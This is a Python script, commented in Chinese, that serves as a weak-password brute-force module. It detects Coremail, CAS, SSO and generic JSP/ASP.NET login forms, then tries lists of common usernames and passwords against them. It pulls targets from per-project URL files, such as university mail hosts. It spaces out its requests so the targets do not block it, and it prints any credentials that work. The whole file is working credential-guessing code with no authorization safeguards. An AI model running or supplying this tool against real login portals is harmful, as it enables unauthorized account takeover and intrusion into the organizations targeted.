#!/usr/bin/env python3
"""
弱口令爆破模块 v1.0
支持: Coremail / CAS / 通用JSP登录 / ASP.NET登录
自动识别登录系统类型，测试常见弱密码
用法: python weak_passwd_scanner.py --project whsu
      python weak_passwd_scanner.py --url https://mail.xxx.edu.cn/
"""
import argparse
import os
import re
import time
import urllib3
import requests
from urllib.parse import urljoin

urllib3.disable_warnings()

# ==================== 配置 ====================
TIMEOUT = 8
DELAY = 2  # 请求间隔，防封

# 常见弱密码
COMMON_PASSWORDS = [
    "123456", "12345678", "123456789", "password", "admin123",
    "admin", "Admin123", "Admin@123", "pass123", "Pass1234",
    "000000", "111111", "888888", "666666",
    "test", "test123", "guest",
]

# 常见用户名
COMMON_USERS = ["admin", "test", "guest", "user", "manager", "root"]

# ==================== 系统识别 ====================

def detect_system(url):
    """自动识别登录系统类型"""
    try:
        r = requests.get(url, timeout=TIMEOUT, verify=False, allow_redirects=True)
        final_url = r.url
        html = r.text.lower()

        if 'coremail' in html or 'coremail' in final_url:
            return 'coremail'
        if 'cas' in final_url or 'central authentication service' in html:
            return 'cas'
        if 'oauth' in final_url or 'openid' in final_url:
            return 'oauth'
        if 'sso' in final_url or '单点登录' in r.text:
            return 'sso'

        # 通用表单检测
        if '<form' in html and ('password' in html or '密码' in r.text):
            if '.jsp' in final_url or 'java' in html:
                return 'jsp_login'
            if '.aspx' in final_url or 'asp.net' in html:
                return 'asp_login'
            return 'generic_form'

        return 'unknown'
    except Exception:
        return 'unknown'


# ==================== Coremail ====================

def crack_coremail(base_url):
    """Coremail 邮件系统弱口令爆破"""
    results = []
    login_url = urljoin(base_url, '/coremail/index.jsp')
    if not login_url.endswith('?'):
        login_url = base_url

    s = requests.Session()
    s.verify = False

    # 先获取 uid/sid 等参数
    try:
        r = s.get(login_url, timeout=TIMEOUT)
        uid_match = re.search(r'name="uid"[^>]*value="([^"]*)"', r.text)
        csrf_match = re.search(r'name="_token"[^>]*value="([^"]*)"', r.text)
    except Exception:
        return results

    # 常见邮箱弱密码组合
    test_users = ['admin', 'test', 'mail', 'service', 'postmaster']

    for user in test_users:
        for pwd in COMMON_PASSWORDS[:10]:
            try:
                data = {
                    'uid': user,
                    'password': pwd,
                    'action:login': '',
                }
                r = s.post(login_url, data=data, timeout=TIMEOUT, allow_redirects=False)

                # 判断成功: 302跳转 + 设置了cookie
                if r.status_code in (302, 301) and 'Set-Cookie' in str(r.headers):
                    # 验证不是回到登录页
                    if 'login' not in r.headers.get('Location', '').lower():
                        results.append(('Coremail', login_url, user, pwd, r.status_code))
                        print(f'    [!!!] {user}:{pwd} -> {r.status_code}')
                        break
                elif '登陆成功' in r.text or '登录成功' in r.text:
                    results.append(('Coremail', login_url, user, pwd, 200))
                    print(f'    [!!!] {user}:{pwd} -> 200 登录成功')
                    break

                time.sleep(DELAY)
            except Exception:
                pass

    return results


# ==================== 通用表单登陆 ====================

def crack_generic(url, system_type):
    """通用登录表单爆破"""
    results = []

    s = requests.Session()
    s.verify = False
    try:
        r = s.get(url, timeout=TIMEOUT)
    except Exception:
        return results

    # 找表单字段
    html = r.text
    username_field = None
    password_field = None

    for name in ['username', 'user', 'uname', 'account', 'email', 'loginName',
                 'userName', 'UserId', 'txtUser', 'txtUsername']:
        if f'name="{name}"' in html or f"name='{name}'" in html or f'id="{name}"' in html:
            username_field = name
            break

    for name in ['password', 'pass', 'pwd', 'passwd', 'txtPwd', 'txtPassword']:
        if f'name="{name}"' in html or f"name='{name}'" in html or f'id="{name}"' in html:
            password_field = name
            break

    if not username_field or not password_field:
        return results

    # 提取表单action
    action_match = re.search(r'action="([^"]*)"', html)
    action = action_match.group(1) if action_match else url
    if not action.startswith('http'):
        action = urljoin(url, action)

    print(f'    表单: {username_field} + {password_field} -> {action[:80]}')

    for user in COMMON_USERS:
        for pwd in COMMON_PASSWORDS[:8]:
            try:
                data = {
                    username_field: user,
                    password_field: pwd,
                }
                r = s.post(action, data=data, timeout=TIMEOUT, allow_redirects=False)

                # 成功标志: 非200可能跳转了, 或者页面不包含"密码错误"
                if r.status_code in (302, 301):
                    loc = r.headers.get('Location', '')
                    if 'login' not in loc.lower() and 'error' not in loc.lower():
                        results.append((system_type, url, user, pwd, r.status_code))
                        print(f'    [!!!] {user}:{pwd} -> 302 {loc[:60]}')
                        break
                elif '密码' not in r.text and '错误' not in r.text and '失败' not in r.text:
                    if len(r.text) > 100:
                        results.append((system_type, url, user, pwd, 200))
                        print(f'    [!!!] {user}:{pwd} -> 200 (可能成功)')
                        break

                time.sleep(DELAY)
            except Exception:
                pass

    return results


# ==================== 主流程 ====================

def scan_target(url, label=''):
    """扫描单个目标"""
    print(f'\n[*] {label} {url[:90]}')

    sys_type = detect_system(url)
    print(f'    系统: {sys_type}')

    if sys_type == 'coremail':
        return crack_coremail(url)
    elif sys_type in ('jsp_login', 'asp_login', 'generic_form', 'sso', 'cas'):
        return crack_generic(url, sys_type)
    else:
        print(f'    [-] 未识别，跳过')
        return []


def main():
    parser = argparse.ArgumentParser(description="弱口令爆破模块")
    parser.add_argument("--project", default=None, help="项目缩写")
    parser.add_argument("--url", default=None, help="单个URL")
    args = parser.parse_args()

    all_results = []

    if args.url:
        all_results.extend(scan_target(args.url, ''))

    elif args.project:
        # 从URL文件找登录口
        urls_file = f'D:/PythonSource/PythonProjects/PythonProject4/{args.project}/{args.project}_urls.txt'
        if not os.path.isfile(urls_file):
            print(f'[!] {urls_file} 不存在')
            return

        login_kw = ['login', 'auth', 'sso', 'idp', 'cas', 'portal', 'mail', 'signin',
                     'coremail', 'imap', 'pop', 'smtp']
        targets = []
        with open(urls_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line.startswith('http'):
                    continue
                for kw in login_kw:
                    if kw in line.lower():
                        targets.append(line)
                        break

        print(f'[*] 找到 {len(targets)} 个潜在登录口')
        for url in targets[:8]:  # 限制8个，防封
            all_results.extend(scan_target(url, ''))

    sep = '=' * 50
    print(f'\n{sep}')
    print(f'结果: {len(all_results)} 个弱口令')
    for r in all_results:
        print(f'  [{r[0]}] {r[1]}  {r[2]}:{r[3]}  ({r[4]})')
    print(f'{sep}')


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] 已取消")
    try:
        input("\n按 Enter 退出...")
    except (EOFError, KeyboardInterrupt):
        pass
